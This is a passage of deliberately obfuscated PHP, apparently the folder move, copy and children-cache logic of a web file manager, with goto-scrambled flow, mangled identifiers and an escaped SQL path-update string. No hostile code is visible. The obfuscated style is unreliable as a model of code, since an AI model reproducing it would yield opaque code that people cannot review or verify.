$_SERVER[ã®Â„Éæ¹¤]; $Bğ°‹‡÷Ø± = $this->sourceInfoCache($cÑÑµñ¿Æ¸); $dÌ‹Å¡³‹„ = $this->sourceInfoCache($F½–ìØ¬Ò); goto b³…‚åŞ••; bÉ¥¢õæŒª: $this->chunkEventSet($A²ğÙ•ª[517], array($A²ğÙ•ª[518], $b…’óƒ¿Œ¿, $fËõİë¿ˆ)); $this->saveAll($b„óéù±§¬); return $D–ÖØƒ¿Ö; goto D†¼Ú‡ğÇµ; Bâö‡ŸÊÖŒ: foreach ($eŸ„¨ëºŠ¦ as $C‡…¢¸”„) { $CãŸ¬˜´¼— = $C‡…¢¸”„[$A²ğÙ•ª[369]]; $bì½ˆï¢ÌÙ = $this->_childrenMatch($DÀÓğµ†˜£, $C‡…¢¸”„, $CÜö¥±§‘); $D†¯ĞÑÏ¥ä[] = array($A²ğÙ•ª[369], $CãŸ¬˜´¼—, $A²ğÙ•ª[463], $bì½ˆï¢ÌÙ[$A²ğÙ•ª[463]]); $b„óéù±§¬[] = array($A²ğÙ•ª[369], $CãŸ¬˜´¼—, $A²ğÙ•ª[461], $bì½ˆï¢ÌÙ[$A²ğÙ•ª[461]]); $this->_copyApplyMeta($C‡…¢¸”„, $C£‹œÖÙ¦ò); if ($C‡…¢¸”„[$A²ğÙ•ª[370]] != $A²ğÙ•ª[83]) { $C£‹œÖÙ¦ò[$A²ğÙ•ª[503]][] = $C‡…¢¸”„[$A²ğÙ•ª[419]]; } } $this->chunkEventSet($A²ğÙ•ª[515], array($A²ğÙ•ª[516], $b…’óƒ¿Œ¿, $fËõİë¿ˆ)); $this->saveAll($D†¯ĞÑÏ¥ä); goto bÉ¥¢õæŒª; bÅ´ÀˆÍ°Ì: $this->_childrenListAll($cÑÑµñ¿Æ¸, $eÂòªÑÆß); $fËõİë¿ˆ = count($eÂòªÑÆß); if ($fËõİë¿ˆ == 0) { return $D–ÖØƒ¿Ö; } goto bÖé Ö¾¥ã; EÅº¯ß¼‚¼: $D–ÖØƒ¿Ö = $this->add($b…’óƒ¿Œ¿); $dœÌğ›ƒ¢– = array($A²ğÙ•ª[369] => $D–ÖØƒ¿Ö, $A²ğÙ•ª[28] => $F÷åÄ¡Ã¸Ä); $this->_copyApplyMeta($dœÌğ›ƒ¢–, $C£‹œÖÙ¦ò); goto f¡â¤ùÁÄÂ; b³…‚åŞ••: $b…’óƒ¿Œ¿ = $this->_makeItemData($Bğ°‹‡÷Ø±, $dÌ‹Å¡³‹„, $F÷åÄ¡Ã¸Ä); Hook::trigger($A²ğÙ•ª[510], $b…’óƒ¿Œ¿); Hook::trigger($A²ğÙ•ª[511], array($A²ğÙ•ª[512], $b…’óƒ¿Œ¿, 0)); goto EÅº¯ß¼‚¼; dˆ˜¥™Ñ‚“: $DÀÓğµ†˜£[$cÑÑµñ¿Æ¸] = $D–ÖØƒ¿Ö; $D†¯ĞÑÏ¥ä = array(); $b„óéù±§¬ = array(); goto Bâö‡ŸÊÖŒ; f¡â¤ùÁÄÂ: if ($Bğ°‹‡÷Ø±[$A²ğÙ•ª[370]] != $A²ğÙ•ª[83]) { $C£‹œÖÙ¦ò[$A²ğÙ•ª[503]][] = $Bğ°‹‡÷Ø±[$A²ğÙ•ª[419]]; return $D–ÖØƒ¿Ö; } $eÂòªÑÆß = array(); $bä‡¨‚ŠÆ‰ = array(); goto bÅ´ÀˆÍ°Ì; dÎí„š¤Áö: $this->addAll($bä‡¨‚ŠÆ‰, array(), !1); $eŸ„¨ëºŠ¦ = $this->where(array($A²ğÙ•ª[463] => $D–ÖØƒ¿Ö))->select(); $DÀÓğµ†˜£ = $this->_childrenMakeRelation($eÂòªÑÆß, $eŸ„¨ëºŠ¦); goto dˆ˜¥™Ñ‚“; bÖé Ö¾¥ã: $CÜö¥±§‘ = $this->sourceInfo($D–ÖØƒ¿Ö); foreach ($eÂòªÑÆß as $C‡…¢¸”„) { $CêÎÒ“ŠóÊ = $this->_makeItemData($C‡…¢¸”„, $CÜö¥±§‘, $C‡…¢¸”„[$A²ğÙ•ª[28]]); $CêÎÒ“ŠóÊ[$A²ğÙ•ª[461]] = $C‡…¢¸”„[$A²ğÙ•ª[461]]; $bä‡¨‚ŠÆ‰[] = $CêÎÒ“ŠóÊ; } $this->chunkEventSet($A²ğÙ•ª[513], array($A²ğÙ•ª[514], $b…’óƒ¿Œ¿, $fËõİë¿ˆ)); goto dÎí„š¤Áö; D†¼Ú‡ğÇµ: } private function _childrenMakeRelation($E«ÓŞ´ì, $Aí•Ø©öğ©) { $Aæ““ì•ÆŸ =& $_SERVER[ã®Â„Éæ¹¤]; $AÒ§´›–· = array(); $aŒ±±ÒÔ = array(); foreach ($E«ÓŞ´ì as $AŒ±Õ‹¤ëÕ) { $F¦Â·‚©íŒ = $AŒ±Õ‹¤ëÕ[$Aæ““ì•ÆŸ[28]] . $Aæ““ì•ÆŸ[8] . $AŒ±Õ‹¤ëÕ[$Aæ““ì•ÆŸ[461]]; $AÒ§´›–·[$F¦Â·‚©íŒ] = $AŒ±Õ‹¤ëÕ[$Aæ““ì•ÆŸ[369]]; } foreach ($Aí•Ø©öğ© as $AŒ±Õ‹¤ëÕ) { $F¦Â·‚©íŒ = $AŒ±Õ‹¤ëÕ[$Aæ““ì•ÆŸ[28]] . $Aæ““ì•ÆŸ[8] . $AŒ±Õ‹¤ëÕ[$Aæ““ì•ÆŸ[461]]; $fù²¶¬äò˜ = $AÒ§´›–·[$F¦Â·‚©íŒ]; $aŒ±±ÒÔ[$fù²¶¬äò˜] = $AŒ±Õ‹¤ëÕ[$Aæ““ì•ÆŸ[369]]; } return $aŒ±±ÒÔ; } private function _childrenMatch($Eæ¨ˆçÔØÖ, $bê¿¦Îˆ¬ò, $B•Ë§Â®˜) { goto CÌ¸›öªÚä; CÌ¸›öªÚä: $D…Ë¶¤ˆù =& $_SERVER[ã®Â„Éæ¹¤]; $aŠ¬å—ÆˆÁ = $B•Ë§Â®˜[$D…Ë¶¤ˆù[461]]; $dÚÅ¯”Ÿİ = $this->parentLevelArray($bê¿¦Îˆ¬ò[$D…Ë¶¤ˆù[461]]); goto a½ë¯Çíğ£; a½ë¯Çíğ£: foreach ($dÚÅ¯”Ÿİ as $Fˆ”«‹§³É) { if (isset($Eæ¨ˆçÔØÖ[$Fˆ”«‹§³É])) { $aŠ¬å—ÆˆÁ .= $Eæ¨ˆçÔØÖ[$Fˆ”«‹§³É] . $D…Ë¶¤ˆù[519]; } } $aŠ¬å—ÆˆÁ = rtrim($aŠ¬å—ÆˆÁ, $D…Ë¶¤ˆù[47]) . $D…Ë¶¤ˆù[47]; $c¼æ§®§ñÍ = $this->parentLevelArray($aŠ¬å—ÆˆÁ); goto FŞÂºÖÉï; FŞÂºÖÉï: $BèƒÔ­‹  = $c¼æ§®§ñÍ[count($c¼æ§®§ñÍ) - 1]; return array($D…Ë¶¤ˆù[463] => $BèƒÔ­‹ , $D…Ë¶¤ˆù[461] => $aŠ¬å—ÆˆÁ); goto B¢á¾™èˆ‰; B¢á¾™èˆ‰: } private function _makeItemData($eÇÙÕÏã¼­, $dÜİª¤ŠÜŞ, $A³²¨ÔËÏ) { $e‰¾¯Ÿ‹‚ =& $_SERVER[ã®Â„Éæ¹¤]; $CŸ´ÖÚôç = array($e‰¾¯Ÿ‹‚[520] => $eÇÙÕÏã¼­[$e‰¾¯Ÿ‹‚[370]], $e‰¾¯Ÿ‹‚[386] => $A³²¨ÔËÏ, $e‰¾¯Ÿ‹‚[521] => $eÇÙÕÏã¼­[$e‰¾¯Ÿ‹‚[372]], $e‰¾¯Ÿ‹‚[420] => $eÇÙÕÏã¼­[$e‰¾¯Ÿ‹‚[419]], $e‰¾¯Ÿ‹‚[522] => $eÇÙÕÏã¼­[$e‰¾¯Ÿ‹‚[77]], $e‰¾¯Ÿ‹‚[523] => $dÜİª¤ŠÜŞ[$e‰¾¯Ÿ‹‚[371]], $e‰¾¯Ÿ‹‚[524] => $dÜİª¤ŠÜŞ[$e‰¾¯Ÿ‹‚[458]], $e‰¾¯Ÿ‹‚[525] => USER_ID, $e‰¾¯Ÿ‹‚[526] => USER_ID, $e‰¾¯Ÿ‹‚[368] => $dÜİª¤ŠÜŞ[$e‰¾¯Ÿ‹‚[369]], $e‰¾¯Ÿ‹‚[527] => $dÜİª¤ŠÜŞ[$e‰¾¯Ÿ‹‚[461]] . $dÜİª¤ŠÜŞ[$e‰¾¯Ÿ‹‚[369]] . $e‰¾¯Ÿ‹‚[47], $e‰¾¯Ÿ‹‚[396] => 0, $e‰¾¯Ÿ‹‚[528] => $e‰¾¯Ÿ‹‚[33]); return $CŸ´ÖÚôç; } private function _copyApplyMeta($e¹§‹İ·ï, &$fä‰•Á¨£•) { $FƒŠÔ½¿Á =& $_SERVER[ã®Â„Éæ¹¤]; $aÅÇêŒÖ“Ï = $e¹§‹İ·ï[$FƒŠÔ½¿Á[369]]; $BÂ¨ŒĞ–ˆí = $e¹§‹İ·ï[$FƒŠÔ½¿Á[28]]; if (!isset($e¹§‹İ·ï[$FƒŠÔ½¿Á[529]]) || !$e¹§‹İ·ï[$FƒŠÔ½¿Á[529]] || $e¹§‹İ·ï[$FƒŠÔ½¿Á[529]] == $FƒŠÔ½¿Á[470]) { $fä‰•Á¨£•[$FƒŠÔ½¿Á[505]][] = array($FƒŠÔ½¿Á[369], $aÅÇêŒÖ“Ï, $FƒŠÔ½¿Á[529], short_id($aÅÇêŒÖ“Ï)); } if (Input::check($BÂ¨ŒĞ–ˆí, $FƒŠÔ½¿Á[530])) { $fä‰•Á¨£•[$FƒŠÔ½¿Á[504]][] = array($FƒŠÔ½¿Á[369] => $aÅÇêŒÖ“Ï, $FƒŠÔ½¿Á[89] => $FƒŠÔ½¿Á[416], $FƒŠÔ½¿Á[359] => str_replace($FƒŠÔ½¿Á[50], $FƒŠÔ½¿Á[33], Pinyin::encode($BÂ¨ŒĞ–ˆí))); $fä‰•Á¨£•[$FƒŠÔ½¿Á[504]][] = array($FƒŠÔ½¿Á[369] => $aÅÇêŒÖ“Ï, $FƒŠÔ½¿Á[89] => $FƒŠÔ½¿Á[415], $FƒŠÔ½¿Á[359] => Pinyin::encode($BÂ¨ŒĞ–ˆí, $FƒŠÔ½¿Á[531])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($DõÑ°ÔÃ¦¿) { goto dÔ‡¹Á Ş×; dÔ‡¹Á Ş×: $DŞäìÂ³†Ë =& $_SERVER[ã®Â„Éæ¹¤]; $a¡ “°™› = $this->sourceInfo($DõÑ°ÔÃ¦¿); $aÈªòˆ…Ğ = $DŞäìÂ³†Ë[398]; goto F›Ÿ“î˜; F›Ÿ“î˜: $DãØ’–ôÅ˜ = array($DŞäìÂ³†Ë[461] => array($DŞäìÂ³†Ë[485], $a¡ “°™›[$DŞäìÂ³†Ë[461]] . $DõÑ°ÔÃ¦¿ . $DŞäìÂ³†Ë[486]), $DŞäìÂ³†Ë[397] => $this->targetIsDelete); $Cß©¯ËÔ–· = $this->field($aÈªòˆ…Ğ)->where($DãØ’–ôÅ˜)->select(); if (!$Cß©¯ËÔ–·) { return; } goto b•„ÒÌçÛÛ; b•„ÒÌçÛÛ: $Cß©¯ËÔ–· = array_to_keyvalue($Cß©¯ËÔ–·, $DŞäìÂ³†Ë[369]); foreach ($Cß©¯ËÔ–· as $a“³ğô×Õ¨) { $EëßöÆ„ÁØ = $a“³ğô×Õ¨[$DŞäìÂ³†Ë[463]]; $DõÑ°ÔÃ¦¿ = $a“³ğô×Õ¨[$DŞäìÂ³†Ë[369]]; if (!isset($this->_childrenListCache[$DõÑ°ÔÃ¦¿]) && $a“³ğô×Õ¨[$DŞäìÂ³†Ë[370]] == $DŞäìÂ³†Ë[83]) { $this->_childrenListCache[$DõÑ°ÔÃ¦¿] = array(); } if (!isset($this->_childrenListCache[$EëßöÆ„ÁØ])) { $this->_childrenListCache[$EëßöÆ„ÁØ] = array(); } $this->_childrenListCache[$EëßöÆ„ÁØ][$DõÑ°ÔÃ¦¿] = $a“³ğô×Õ¨; $this->_childrenItemCache[$DõÑ°ÔÃ¦¿] = $a“³ğô×Õ¨; } goto C·î—ç£Š¼; C·î—ç£Š¼: } private function _childrenListAll($E“Âî›­Œ‰, &$C‘·âÚÛ¤Œ) { $b·›†ĞÉÊÒ =& $_SERVER[ã®Â„Éæ¹¤]; if (!isset($this->_childrenListCache[$E“Âî›­Œ‰])) { return; } $b¢¬¯¤óƒì = $this->_childrenListCache[$E“Âî›­Œ‰]; foreach ($b¢¬¯¤óƒì as $BÏìÛ®¦ => $f…‰’â²) { $C‘·âÚÛ¤Œ[$BÏìÛ®¦] = $f…‰’â²; if ($f…‰’â²[$b·›†ĞÉÊÒ[370]] == $b·›†ĞÉÊÒ[83]) { $this->_childrenListAll($BÏìÛ®¦, $C‘·âÚÛ¤Œ); } } } private function sourceInfoCache($dÕŠÍ—Ã´›) { if (isset($this->_childrenItemCache[$dÕŠÍ—Ã´›])) { return $this->_childrenItemCache[$dÕŠÍ—Ã´›]; } return $this->sourceInfo($dÕŠÍ—Ã´›); } private function _childrenList($fÆìƒ¸Ó¾¨) { if (isset($this->_childrenListCache[$fÆìƒ¸Ó¾¨])) { return $this->_childrenListCache[$fÆìƒ¸Ó¾¨]; } return $this->_childrenListSelect($fÆìƒ¸Ó¾¨); } private function _childrenListSelect($D¦ÀŒ˜½×£) { goto eàí²·˜Ú; A™œ¤…ĞÆ: foreach ($c”ç“•øâÖ as $D¦ÀŒ˜½×£ => $FÄ²Û¦¶„±) { $this->_childrenItemCache[$D¦ÀŒ˜½×£] = $FÄ²Û¦¶„±; } return $c”ç“•øâÖ; goto dœÁß†»Ñ´; eàí²·˜Ú: $b”Ì™™õ =& $_SERVER[ã®Â„Éæ¹¤]; $C†•è¶Ö– = array($b”Ì™™õ[463] => $D¦ÀŒ˜½×£, $b”Ì™™õ[397] => $this->targetIsDelete); $DÒé‹›¼ = $this->where($C†•è¶Ö–)->select(); goto bÁçÕ’––; bÁçÕ’––: $DÒé‹›¼ = $DÒé‹›¼ ? $DÒé‹›¼ : array(); $c”ç“•øâÖ = array_to_keyvalue($DÒé‹›¼, $b”Ì™™õ[369]); $this->_childrenListCache[$D¦ÀŒ˜½×£] = $c”ç“•øâÖ; goto A™œ¤…ĞÆ; dœÁß†»Ñ´: } private function fileNameExistCache($E¥ñÛ¶ƒ™£, $a‰­ˆ‚»•) { $E¬¼Œšõ”‘ =& $_SERVER[ã®Â„Éæ¹¤]; $a‰­ˆ‚»• = strtolower($a‰­ˆ‚»•); $a­äÅ÷ó­… = $this->_childrenList($E¥ñÛ¶ƒ™£); foreach ($a­äÅ÷ó­… as $Eöæå÷ÄŒ£) { if ($a‰­ˆ‚»• == strtolower($Eöæå÷ÄŒ£[$E¬¼Œšõ”‘[28]])) { return $Eöæå÷ÄŒ£[$E¬¼Œšõ”‘[369]]; } } return !1; } private function fileNameAutoCache($aµÈ×Œà®, $FİÁ¼³…¹, $C“ß‰Êßé†, $AÙ’§‘ù¿ë) { $cÔŒ ­İ” =& $_SERVER[ã®Â„Éæ¹¤]; $d–Şæ¯â = $this->_childrenList($aµÈ×Œà®); $aÖ‰¾çŸ—® = array_to_keyvalue($d–Şæ¯â, $cÔŒ ­İ”[33], $cÔŒ ­İ”[28]); return $this->fileNameAutoGet($aÖ‰¾çŸ—®, $FİÁ¼³…¹, $C“ß‰Êßé†, $AÙ’§‘ù¿ë); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($aõí­‘ˆÙÎ, $Fœ¦õÀ‹Éç, $b ô‹ÙÆÀ„ = REPEAT_REPLACE, $eâà›ìÄ Ò = '') { goto d“œ –Ùñ; Cƒó¢è¿: $this->folderSizeReset($Fœ¦õÀ‹Éç); $b°´»ä©ö = array($eß·ãŠÂ³[$fâÍêÉÃĞ™[463]], $Fœ¦õÀ‹Éç); if ($eß·ãŠÂ³[$fâÍêÉÃĞ™[370]] == $fâÍêÉÃĞ™[83]) { $b°´»ä©ö[] = $aõí­‘ˆÙÎ; } goto e ±‚’‡; a¦Õï·ãíä: $this->lockWriteStart($Fœ¦õÀ‹Éç, $B¶¨Ï–¥¥õ); $F´Æ©ğê—Ä = array($fâÍêÉÃĞ™[503] => array(), $fâÍêÉÃĞ™[534] => !1); $this->clearShare($aõí­‘ˆÙÎ, $Fœ¦õÀ‹Éç); goto fÛ´Ó‡˜ï–; e ±‚’‡: $this->updateModifyTime($b°´»ä©ö); Model($fâÍêÉÃĞ™[507])->eventMove($aõí­‘ˆÙÎ, $eß·ãŠÂ³[$fâÍêÉÃĞ™[463]], $Fœ¦õÀ‹Éç); Hook::trigger($fâÍêÉÃĞ™[533], $e¼Ï‰ø ); goto dÙ´¦ëÚÕ¤; F¤ĞßŞ£Ğ: if ($eß·ãŠÂ³[$fâÍêÉÃĞ™[463]] == $Fœ¦õÀ‹Éç && $eâà›ìÄ Ò != $eß·ãŠÂ³[$fâÍêÉÃĞ™[28]]) { $Cˆãã‚•Ù¢ = $this->fileNameExist($Fœ¦õÀ‹Éç, $eâà›ìÄ Ò); if ($Cˆãã‚•Ù¢ && $eß·ãŠÂ³[$fâÍêÉÃĞ™[370]] == $fâÍêÉÃĞ™[470]) { goto d¯‘Ç®Ù—õ; d¯‘Ç®Ù—õ: $Ašì¸¥Š = $this->sourceInfo($Cˆãã‚•Ù¢); $C‘ĞµÍÔì = $this->fileHistory($Ašì¸¥Š, $eß·ãŠÂ³[$fâÍêÉÃĞ™[419]], $eß·ãŠÂ³[$fâÍêÉÃĞ™[77]]); if (!$C‘ĞµÍÔì) { Model($fâÍêÉÃĞ™[422])->remove($eß·ãŠÂ³[$fâÍêÉÃĞ™[419]]); } goto a«‡—‡Ğæ‰; a«‡—‡Ğæ‰: $this->removeNow($aõí­‘ˆÙÎ, !1); $this->folderSizeReset($Fœ¦õÀ‹Éç); Hook::trigger($fâÍêÉÃĞ™[533], $e¼Ï‰ø ); goto e£ŞĞïëù; e£ŞĞïëù: return $Cˆãã‚•Ù¢; goto DàÆ¡À®–; DàÆ¡À®–: } } $B¶¨Ï–¥¥õ = $eâà›ìÄ Ò ? $eâà›ìÄ Ò : $eß·ãŠÂ³[$fâÍêÉÃĞ™[28]]; $this->lockMoveStart($aõí­‘ˆÙÎ); goto a¦Õï·ãíä; fÛ´Ó‡˜ï–: $A£êÒÉ‚ëš = $this->fileNameExistCache($Fœ¦õÀ‹Éç, $eß·ãŠÂ³[$fâÍêÉÃĞ™[28]]); $féšöÉ¥¿ø = $this->_move($aõí­‘ˆÙÎ, $Fœ¦õÀ‹Éç, $b ô‹ÙÆÀ„, $F´Æ©ğê—Ä, $eâà›ìÄ Ò); $this->sourceCacheClear(); goto e‡­¹Ç»¢ó; e‡­¹Ç»¢ó: if ($eß·ãŠÂ³[$fâÍêÉÃĞ™[370]] == $fâÍêÉÃĞ™[83] && $A£êÒÉ‚ëš) { $this->folderSizeResetChildren($féšöÉ¥¿ø); } Model($fâÍêÉÃĞ™[167])->linkAdd($F´Æ©ğê—Ä[$fâÍêÉÃĞ™[503]]); if ($A£êÒÉ‚ëš && $F´Æ©ğê—Ä[$fâÍêÉÃĞ™[534]]) { $this->removeNow($aõí­‘ˆÙÎ, !1); } goto c–¸šñ‡Œî; c–¸šñ‡Œî: $this->lockMoveEnd($aõí­‘ˆÙÎ); $this->lockWriteEnd($Fœ¦õÀ‹Éç, $B¶¨Ï–¥¥õ); $this->folderSizeReset($eß·ãŠÂ³[$fâÍêÉÃĞ™[463]]); goto Cƒó¢è¿; dÙ´¦ëÚÕ¤: return $féšöÉ¥¿ø; goto B‡·É§¡…¾; f¦¨êòÀÈÔ: if (!$eß·ãŠÂ³ || !$F¿ÛëöåÅ° || $F¿ÛëöåÅ°[$fâÍêÉÃĞ™[370]] != $fâÍêÉÃĞ™[83]) { return !1; } Hook::trigger($fâÍêÉÃĞ™[532], $e¼Ï‰ø ); $this->targetIsDelete = intval($eß·ãŠÂ³[$fâÍêÉÃĞ™[397]]); goto F¤ĞßŞ£Ğ; d“œ –Ùñ: $fâÍêÉÃĞ™ =& $_SERVER[ã®Â„Éæ¹¤]; $eß·ãŠÂ³ = $this->sourceInfo($aõí­‘ˆÙÎ); $F¿ÛëöåÅ° = $this->sourceInfo($Fœ¦õÀ‹Éç); goto aªâ•¿ğÅ; aªâ•¿ğÅ: if ($eß·ãŠÂ³[$fâÍêÉÃĞ™[463]] == $F¿ÛëöåÅ°[$fâÍêÉÃĞ™[369]]) { if ($eß·ãŠÂ³[$fâÍêÉÃĞ™[397]] == $fâÍêÉÃĞ™[83]) { Model($fâÍêÉÃĞ™[395])->restore(array($aõí­‘ˆÙÎ)); } return $aõí­‘ˆÙÎ; } $e¼Ï‰ø  = $this->pathInfoMore($aõí­‘ˆÙÎ); if ($this->isParentOf($aõí­‘ˆÙÎ, $Fœ¦õÀ‹Éç)) { return !1; } goto f¦¨êòÀÈÔ; B‡·É§¡…¾: } private function _move($fëö…óß¿, $BÆ²ÕäšŞ˜, $EÑò˜öä, &$eóÛ…Åéå¾, $aš¡¥©Ì±ï = '') { goto A”™–ŸØš; EÉÛÂØ®Ö: return $e„Ï‹ŒÊå©; goto bÊÈÎ™éå; DÙñ¥à‘²Ó: $this->lockWriteStart($BÆ²ÕäšŞ˜, $fÁ®õÙåòö); if (!$Fåµ‚Ìâã) { return $this->_moveForce($fëö…óß¿, $BÆ²ÕäšŞ˜, $fÁ®õÙåòö); } $e„Ï‹ŒÊå© = $Fåµ‚Ìâã; goto F¬á³ÈÙÖ; A”™–ŸØš: $a´‰¢íµ›‹ =& $_SERVER[ã®Â„Éæ¹¤]; $C®“Œ–»Ø = $this->sourceInfo($fëö…óß¿); $B‰ŠÍç” = $C®“Œ–»Ø[$a´‰¢íµ›‹[370]] == $a´‰¢íµ›‹[83]; goto EàÆœ§ó‡; EàÆœ§ó‡: $fÁ®õÙåòö = $aš¡¥©Ì±ï ? $aš¡¥©Ì±ï : $C®“Œ–»Ø[$a´‰¢íµ›‹[28]]; $Fåµ‚Ìâã = $this->fileNameExistCache($BÆ²ÕäšŞ˜, $fÁ®õÙåòö); $this->lockMoveStart($fëö…óß¿); goto DÙñ¥à‘²Ó; F¬á³ÈÙÖ: $AÁÉ„Ö‚·ö = !1; if ($B‰ŠÍç”) { if ($EÑò˜öä == REPEAT_RENAME_FOLDER) { $fÁ®õÙåòö = $this->fileNameAuto($BÆ²ÕäšŞ˜, $fÁ®õÙåòö, $EÑò˜öä, $B‰ŠÍç”); $e„Ï‹ŒÊå© = $this->_moveForce($fëö…óß¿, $BÆ²ÕäšŞ˜, $fÁ®õÙåòö); } else { if ($EÑò˜öä == REPEAT_RENAME_FOLDER) { $EÑò˜öä = REPEAT_RENAME; } $b¬§÷°—Ş = $this->_childrenListSelect($fëö…óß¿); foreach ($b¬§÷°—Ş as $a›µŠ­Ñ’) { $this->_move($a›µŠ­Ñ’[$a´‰¢íµ›‹[369]], $Fåµ‚Ìâã, $EÑò˜öä, $eóÛ…Åéå¾); } $AÁÉ„Ö‚·ö = !0; } } else { if ($EÑò˜öä == REPEAT_SKIP) { $AÁÉ„Ö‚·ö = !0; } else { if ($EÑò˜öä == REPEAT_RENAME || $EÑò˜öä == REPEAT_RENAME_FOLDER) { $fÁ®õÙåòö = $this->fileNameAuto($BÆ²ÕäšŞ˜, $fÁ®õÙåòö, $EÑò˜öä, $B‰ŠÍç”); $e„Ï‹ŒÊå© = $this->_moveForce($fëö…óß¿, $BÆ²ÕäšŞ˜, $fÁ®õÙåòö); } else { if ($EÑò˜öä == REPEAT_REPLACE) { $C§¯Âæà = $this->sourceInfoCache($Fåµ‚Ìâã); $d†æœÄğ† = $this->fileHistory($C§¯Âæà, $C®“Œ–»Ø[$a´‰¢íµ›‹[419]], $C®“Œ–»Ø[$a´‰¢íµ›‹[77]]); if ($d†æœÄğ†) { $eóÛ…Åéå¾[$a´‰¢íµ›‹[503]][] = $C®“Œ–»Ø[$a´‰¢íµ›‹[419]]; } else { $AÁÉ„Ö‚·ö = !0; } } } } } if ($AÁÉ„Ö‚·ö && !$eóÛ…Åéå¾[$a´‰¢íµ›‹[534]]) { $eóÛ…Åéå¾[$a´‰¢íµ›‹[534]] = !0; } goto EÉÛÂØ®Ö; bÊÈÎ™éå: } private function _moveForce($dë†ÉÎ›„, $cœ¿îŞó¢, $fñŸ›‰Ô›) { goto c£ÊÓõ¯ÈÜ; bóÍ¥ê‹Õ: if ($E©’ŒŒ°µÚ) { $CÁÕêÑÍ· = array($AÂè•²²¥¿[527] => array($AÂè•²²¥¿[485], $AÖ´ˆß•æ©[$AÂè•²²¥¿[461]] . $AÖ´ˆß•æ©[$AÂè•²²¥¿[369]] . $AÂè•²²¥¿[486])); $Cù¸±ÎØÆ˜ = $AÖ´ˆß•æ©[$AÂè•²²¥¿[461]] . $AÖ´ˆß•æ©[$AÂè•²²¥¿[369]] . $AÂè•²²¥¿[47]; $eÄµ‹íÃÃØ = $dÜÎòİÅ¬¥[$AÂè•²²¥¿[461]] . $dÜÎòİÅ¬¥[$AÂè•²²¥¿[369]] . $AÂè•²²¥¿[47] . $AÖ´ˆß•æ©[$AÂè•²²¥¿[369]] . $AÂè•²²¥¿[47]; $B‰éªÇŒÄ˜ = array($AÂè•²²¥¿[527] => array($AÂè•²²¥¿[535], "\162\145\160\154\141\x63\145\x28\x70\x61\x72\x65\x6e\x74\x4c\x65\166\145\154\54\47{$Cù¸±ÎØÆ˜}\47\x2c\x27{$eÄµ‹íÃÃØ}\x27\x29"), $AÂè•²²¥¿[523] => $dÜÎòİÅ¬¥[$AÂè•²²¥¿[371]], $AÂè•²²¥¿[524] => $dÜÎòİÅ¬¥[$AÂè•²²¥¿[458]]); if ($dğ³Ï¬É) { $B‰éªÇŒÄ˜[$AÂè•²²¥¿[396]] = 0; } $this->where($CÁÕêÑÍ·)->data($B‰éªÇŒÄ˜)->save(); } $this->where(array($AÂè•²²¥¿[383] => $dë†ÉÎ›„))->data($aÚğ¢Šœ†õ)->save(); return $dë†ÉÎ›„; goto EÆË™Ø‡Ğ; Cß±Î²¥›: if (!$B›š—÷ğ¢ç) { Model($AÂè•²²¥¿[456])->authClear($dë†ÉÎ›„); } $dğ³Ï¬É = $AÖ´ˆß•æ©[$AÂè•²²¥¿[397]] == $AÂè•²²¥¿[83] && $dÜÎòİÅ¬¥[$AÂè•²²¥¿[397]] != $AÂè•²²¥¿[83]; if ($dğ³Ï¬É) { $aÚğ¢Šœ†õ[$AÂè•²²¥¿[396]] = 0; } goto bóÍ¥ê‹Õ; B¯»ù¿ˆˆÕ: $E©’ŒŒ°µÚ = $AÖ´ˆß•æ©[$AÂè•²²¥¿[370]] == $AÂè•²²¥¿[83]; $aÚğ¢Šœ†õ = array($AÂè•²²¥¿[368] => $dÜÎòİÅ¬¥[$AÂè•²²¥¿[369]], $AÂè•²²¥¿[527] => $dÜÎòİÅ¬¥[$AÂè•²²¥¿[461]] . $dÜÎòİÅ¬¥[$AÂè•²²¥¿[369]] . $AÂè•²²¥¿[47], $AÂè•²²¥¿[523] => $dÜÎòİÅ¬¥[$AÂè•²²¥¿[371]], $AÂè•²²¥¿[524] => $dÜÎòİÅ¬¥[$AÂè•²²¥¿[458]], $AÂè•²²¥¿[526] => USER_ID, $AÂè•²²¥¿[386] => $fñŸ›‰Ô›); $B›š—÷ğ¢ç = $AÖ´ˆß•æ©[$AÂè•²²¥¿[371]] == SourceModel::TYPE_GROUP && $dÜÎòİÅ¬¥[$AÂè•²²¥¿[371]] == SourceModel::TYPE_GROUP && $AÖ´ˆß•æ©[$AÂè•²²¥¿[458]] == $dÜÎòİÅ¬¥[$AÂè•²²¥¿[458]]; goto Cß±Î²¥›; c£ÊÓõ¯ÈÜ: $AÂè•²²¥¿ =& $_SERVER[ã®Â„Éæ¹¤]; $AÖ´ˆß•æ© = $this->sourceInfo($dë†ÉÎ›„); $dÜÎòİÅ¬¥ = $this->sourceInfo($cœ¿îŞó¢); goto B¯»ù¿ˆˆÕ; EÆË™Ø‡Ğ: } private function clearShare($béœÖ –, $F¼îÏ²×Ä) { goto bİ†î¿©ç˜; b«­ãŸƒº: if (!$d“÷¸ÊÙ¢) { return; } $F¿íÛñÖ = array($Bñ³¥Ê¨¹Ö[369] => array($Bñ³¥Ê¨¹Ö[7], $d“÷¸ÊÙ¢), $Bñ³¥Ê¨¹Ö[448] => 1); $A¯µÑàçÎÔ = Model($Bñ³¥Ê¨¹Ö[537])->field($Bñ³¥Ê¨¹Ö[441])->where($F¿íÛñÖ)->select(); goto F–Ç§Œ¼’î; D‡¨ì¾ªÊ«: if ($f÷Ş‚ïÇåÚ[$Bñ³¥Ê¨¹Ö[458]] == $Añ¢¸Áãê[$Bñ³¥Ê¨¹Ö[458]] && $f÷Ş‚ïÇåÚ[$Bñ³¥Ê¨¹Ö[371]] == $Bñ³¥Ê¨¹Ö[536]) { return; } $F¿íÛñÖ = array($Bñ³¥Ê¨¹Ö[461] => array($Bñ³¥Ê¨¹Ö[485], $f÷Ş‚ïÇåÚ[$Bñ³¥Ê¨¹Ö[461]] . $béœÖ – . $Bñ³¥Ê¨¹Ö[486])); $d“÷¸ÊÙ¢ = $this->field($Bñ³¥Ê¨¹Ö[383])->where($F¿íÛñÖ)->getField($Bñ³¥Ê¨¹Ö[369], !0); goto b«­ãŸƒº; F–Ç§Œ¼’î: if (!$A¯µÑàçÎÔ) { return; } $A¯µÑàçÎÔ = array_to_keyvalue($A¯µÑàçÎÔ, $Bñ³¥Ê¨¹Ö[33], $Bñ³¥Ê¨¹Ö[441]); 